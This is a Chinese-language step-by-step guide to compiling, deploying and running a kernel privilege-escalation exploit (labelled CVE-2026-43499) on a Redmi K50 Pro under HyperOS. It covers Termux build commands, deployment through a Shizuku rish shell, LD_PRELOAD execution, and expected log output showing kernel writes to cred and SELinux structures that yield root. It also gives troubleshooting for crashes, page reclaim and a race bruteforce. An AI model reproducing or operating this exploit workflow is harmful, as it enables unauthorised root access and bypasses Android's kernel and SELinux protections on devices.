# Termux 编译与测试指南 — Page Reuse 融合版

> 目标: 在 Termux 中编译融合版 exploit,通过 rish 部署到设备运行
> 设备: Redmi K50 Pro (matisse) / HyperOS 2.0.6.0.ULKCNXM
> 日期: 2026-07-16

---

## 前置条件

1. Termux 已安装 clang 和 make
2. Shizuku 已授权 rish (uid=2000 shell)
3. 手机刚重启 (每次重启后最多跑 2 次测试)
4. 设置→显示→休眠→10分钟 (防止息屏)

---

## 步骤 1: 安装编译工具

```bash
pkg update -y
pkg install -y clang make
```

---

## 步骤 2: 编译融合版

```bash
cd /sdcard/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit

# 清除旧构建 (重要! build 缓存会导致旧二进制)
rm -rf build/

# 编译
make PROJECT=blazer-CP2A.260605.012 API=34 CC=clang

# 验证 SHA256 (必须和旧版不同!)
sha256sum build/blazer-CP2A.260605.012/bin/preload.so

# 验证融合代码已编入
strings build/blazer-CP2A.260605.012/bin/preload.so | grep "direct-fusion"
# 应输出:
#   direct-fusion: preparing kernel page once for reuse
#   direct-fusion: page prepared OK
#   direct-fusion: all writes complete, reuse disabled
```

**如果 `strings` 没输出 `direct-fusion`:**
```bash
# build 缓存问题,强制重编
rm -rf build/
make PROJECT=blazer-CP2A.260605.012 API=34 CC=clang
strings build/blazer-CP2A.260605.012/bin/preload.so | grep "direct-fusion"
```

---

## 步骤 3: 复制到项目根目录

```bash
cp build/blazer-CP2A.260605.012/bin/preload.so \
   /sdcard/Documents/matisse_backup_essentials/preload_mtk_R9.so

# 验证
sha256sum /sdcard/Documents/matisse_backup_essentials/preload_mtk_R9.so
# 和步骤2的 SHA256 必须一致
```

---

## 步骤 4: 通过 rish 部署

```bash
# 进入 rish shell (Shizuku)
# 方式1: 如果 rish 命令可用
rish

# 方式2: 裸调 app_process (更可靠)
RISH_APPLICATION_ID=com.termux /system/bin/app_process \
  -Djava.class.path=/data/local/tmp/rish_shizuku.dex \
  /system/bin --nice-name=rish rikka.shizuku.shell.ShizukuShellLoader

# 在 rish 内部署 (强制哈希验证)
bash /sdcard/Documents/matisse_backup_essentials/scripts/deploy.sh \
  /sdcard/Documents/matisse_backup_essentials/preload_mtk_R9.so
```

**deploy.sh 会自动执行:**
1. 计算源文件 SHA256
2. `rm -f /data/local/tmp/preload.so`
3. `cp` 到 `/data/local/tmp/preload.so`
4. `sync`
5. 计算目标文件 SHA256 并对比
6. 不一致 → 拒绝运行,报错退出

---

## 步骤 5: 运行 exploit

```bash
# 在 rish shell 内执行 (uid=2000)
# 保存输出到日志
LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 30 \
  2>&1 | tee /sdcard/Documents/matisse_backup_essentials/logs/R9_test1.txt
```

---

## 步骤 6: 观察日志

### 成功标志 (按顺序):

```
direct-fusion: preparing kernel page once for reuse       ← page 准备开始
direct-fusion: page prepared OK base=... reuse=1          ← page 准备成功
direct-w64[0] target=... reuse=1                          ← 第1次写 (读percpu), 复用page
direct-w64[1] target=... reuse=1                          ← 第2次写 (读entry_task), 复用page
direct-w64[2] target=... reuse=1                          ← 第3次写 (写real_cred), 复用page
direct-w64[3] target=... reuse=1                          ← 第4次写 (写cred+selinux), 复用page
direct-fusion: all writes complete, reuse disabled        ← 全部写完!
direct-root-summary root=1 ...                            ← ROOT 成功!
```

### 可能的结果:

| 结果 | 日志特征 | 含义 |
|------|---------|------|
| **完全成功** | `root=1` + `direct-fusion: all writes complete` | 融合方案成功,root 获取 |
| **首次写崩溃** | `direct-w64[0]` 后日志截断,手机重启 | PI chain 腐败在第一次写就触发 |
| **后续写崩溃** | `direct-w64[1/2/3]` 后日志截断,手机重启 | PI chain 腐败累积导致后续写崩溃 |
| **page 回收** | `direct-w64[N] reuse but page not prepared` + exit 12 | kernel page 被回收 (exit code 12) |
| **bruteforce 失败** | `phase5 bruteforce failed` + exit 12 | pselect 竞态未命中 (正常,多重试) |

---

## 如果首次写后崩溃 (PI chain 问题)

说明融合方案减少了 clone 压力,但 PI chain 腐败仍是瓶颈。下一步:

1. **等手机重启,再跑一次** (bruteforce 有随机性,可能这次碰巧不崩)
2. **如果第二次也崩**,需要减少写操作次数:
   - 合并步骤 3+4 (cred 两次写 → 单次)
   - 或研究写后修复 rt_mutex 状态

---

## 如果 page 被回收 (exit 12)

说明 kernel page 在写操作之间被内核回收。临时方案:

```bash
# 修改 main.c,在 page 准备失败时回退到原始模式
# 当前代码已有 fallback:
#   if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
#       page_reuse_active = 0;  // 回退
#   }
# 但如果是在写操作中途被回收,需要添加检测:
# 在 pipe.c 子进程 reuse 分支检测 exit 12 → 父进程清除 reuse → 重新准备
```

---

## 文件位置速查

```
源码:     /sdcard/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit/
编译产物:  .../exploit/build/blazer-CP2A.260605.012/bin/preload.so
R9 副本:  /sdcard/Documents/matisse_backup_essentials/preload_mtk_R9.so
部署脚本: /sdcard/Documents/matisse_backup_essentials/scripts/deploy.sh
日志:     /sdcard/Documents/matisse_backup_essentials/logs/R9_test1.txt
```

---

## 一键脚本 (复制粘贴)

```bash
# === 编译 ===
cd /sdcard/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit
rm -rf build/
make PROJECT=blazer-CP2A.260605.012 API=34 CC=clang
sha256sum build/blazer-CP2A.260605.012/bin/preload.so
strings build/blazer-CP2A.260605.012/bin/preload.so | grep "direct-fusion"

# === 复制 ===
cp build/blazer-CP2A.260605.012/bin/preload.so /sdcard/Documents/matisse_backup_essentials/preload_mtk_R9.so

# === 进入 rish ===
rish
# (如果 rish 不行,用裸调)
# RISH_APPLICATION_ID=com.termux /system/bin/app_process -Djava.class.path=/data/local/tmp/rish_shizuku.dex /system/bin --nice-name=rish rikka.shizuku.shell.ShizukuShellLoader

# === 部署 (rish 内) ===
bash /sdcard/Documents/matisse_backup_essentials/scripts/deploy.sh /sdcard/Documents/matisse_backup_essentials/preload_mtk_R9.so

# === 运行 (rish 内) ===
LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 30 2>&1 | tee /sdcard/Documents/matisse_backup_essentials/logs/R9_test1.txt
```
